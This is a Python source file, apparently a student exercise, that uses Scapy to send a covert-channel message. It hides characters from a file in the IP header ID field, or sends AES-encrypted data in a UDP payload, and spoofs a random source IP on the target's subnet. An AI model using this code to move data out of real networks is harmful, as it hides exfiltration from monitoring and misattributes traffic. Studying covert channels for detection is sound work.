#standard python modules
import sys
import socket
import random
import argparse
import ipaddress

#scapy and other libraries
from scapy.all import *
from Crypto.Util import *
#from Crypto.Cipher import AES

#user modules
import msgEncoder as mE
import sessionKeyGen

dst_ip="192.168.1.83"
THIS_PC_NAME = socket.gethostname()
THIS_IP = socket.gethostbyname(THIS_PC_NAME) #ipv4 address type
PORT = 5000

ip_mode = 0 #IP ID Field attack (ASCII encoding)
e_mode = 0 #using payload of UDP. different IP sources (AES)

def printHelp():
    print(" usage (order matters):")
    print(" sudo python3 clientProbe.py [\"-i\" or \"-e\"] -d [Destination IP] ")
    print(" -i\tsends ASCII encoded messages through ID field in IP Header.")
    print(" -e\tsends an encrypted message in the UDP payload. Source IP changes every round.")
    print(" optional: can specify port at the end using -p tag. Default is 5000")



if len(sys.argv) < 4:
    printHelp()
    sys.exit(1)

if "-i" in sys.argv[1]:
    ip_mode = 1
elif "-e" in sys.argv[1]:
    e_mode = 1
else:
    printHelp()
    sys.exit(1)

if "-d" not in sys.argv[2] :
    print("required to specify destination IP using -d tag")
    sys.exit(1)
try: #check for format
    ipaddress.IPv4Address(sys.argv[3]) #user inputted destination IP
except AddressValueError:
    print("valid IP Address required for destination")
    sys.exit(1)

dst_ip = sys.argv[3]

if "-p" in sys.argv: #optional tag
    PORT = int(sys.argv[5])
#first method
#id property in IP() packet can carry 16 bits according to RFC
#first method, insert encrypted information into the id property of IP() layer in a UDP packet
#packets are made IP()/UDP() thanks to scapy
def udp_covert():
    msg_to_send = mE.readFile() #list of strings
    for c in msg_to_send:
        addy = different_src()
        sample_pkt = IP(id=ord(c),dst=dst_ip,src=addy)/UDP(dport=PORT)
        print(sample_pkt[IP].id, "port: ",sample_pkt[UDP].dport)
        send(sample_pkt)

#return the last number from ipv4 adress 
def thisMachine():
    ip_str = str(THIS_IP)
    lastDot = ip_str.rfind(".") #return index of last occurrence of dot
    lastNum = ip_str[(lastDot+1):len(ip_str)] #string format
    return lastNum


def different_src():
    avoid = thisMachine() #get host number
    r = random.randint(1,100)
    while r == avoid:
        r = random.randint(1,100)
    newNumStr = str(r)
    fullNumStr = "."+newNumStr
    newAddress = dst_ip[0:dst_ip.rfind(".")]+fullNumStr
    return newAddress

#means to send encrypted data
def src_ip_encrypted():
    fullData = mE.readAll()
    encryptedData = mE.encryptFull(fullData)
    new_src = different_src()
    sample_pkt = IP(src=new_src, dst=dst_ip)/UDP(dport=PORT)/Raw(load=encryptedData)
    send(sample_pkt)

print(ip_mode)
print(e_mode)
if ip_mode == 1:
    udp_covert()
elif e_mode == 1:
    src_ip_encrypted()
